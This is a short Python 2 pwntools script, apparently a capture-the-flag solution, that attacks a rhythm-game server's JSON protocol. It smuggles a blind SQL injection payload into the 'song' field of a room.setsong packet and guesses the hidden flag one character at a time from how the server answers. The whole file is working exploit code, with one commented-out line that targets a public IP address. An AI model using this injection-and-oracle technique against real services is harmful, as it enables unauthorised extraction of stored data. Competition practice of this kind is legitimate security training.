import time
import string
from pwn import *
import json

r = remote('127.0.0.1', 39079)
#r = remote('34.234.204.29', 39079)

def send_packet(d):
    d = '\x01' + json.dumps(d)
    r.sendline(d)

def get_packet(t=None):
    if t:
        v = r.readuntil('\n', timeout=t)
    else:
        v = r.readuntil('\n')
    if v == '':
        return None
    #print v
    return json.loads(v[1:-1])


send_packet(dict(
    topic='user.auth',
    password='',
    name='',
    version='v0.19'))
    
get_packet()


send_packet(dict(topic='server.room.new', name="asdf"))

get_packet()
x = get_packet()

raw_input()

last = False

def query(f):
    #SELECT DISTINCT folderId FROM Charts WHERE path LIKE "%
    si = '" and effector LIKE "flag{'+f
    send_packet({'topic':'room.setsong',
        'song':'asdf',
        'diff':8,
        'level':0,
        'song':si,
        'hash':'aaaaaaaa',
        'audio_hash':'asdf'+f,
        'chart_hash':'asdf'+f})

    for i in range(4):
        v = get_packet(3)
        if v is None:
            return True
        if not any(not x['ready'] for x in  v['users']):
            v = get_packet(0.1)
            v = get_packet(0.1)
            return True
        if any(x['missing_map'] for x in v['users']):
            v = get_packet(0.1)
            v = get_packet(0.1)
            return False
    return False

get_packet()
s = ''
while 1:
    print s
    for c in string.letters+string.digits+' .,}+:<':
        print 'trying',c
        res = query(s+c)
        last = res
        if res:
            s+=c
            break
    if s[-1] == '}':
        break

print s

res = query(s+c)

print '>>>>'
while 1:
    print get_packet()

